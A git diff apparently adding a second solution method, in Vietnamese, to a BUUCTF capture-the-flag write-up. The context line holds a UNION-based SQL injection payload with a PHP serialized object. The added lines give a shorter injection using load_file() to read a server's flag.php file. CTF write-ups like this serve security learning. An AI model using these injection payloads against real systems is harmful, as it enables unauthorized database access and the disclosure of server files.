@@ -173,3 +173,12 @@ and 1=2 union/**/select 1,2,3, 'O:8:"UserInfo":3:{s:4:"name";s:4:"lama";s:3:"age
 ```
 
 ![image](https://github.com/Llam-a/BUUCTF/assets/115911041/1e6e1613-3243-495f-ac1e-56e0c1ead141)
+
+## Cách 2
+
+Bạn có thể dùng payload `load_file()` sẽ nhanh hơn
+
+`and 1=2 union/**/select 1,load_file("/var/www/html/flag.php"),3,4#`
+
+![image](https://github.com/Llam-a/BUUCTF/assets/115911041/08ab1013-806f-4885-a249-849a853598b4)
+
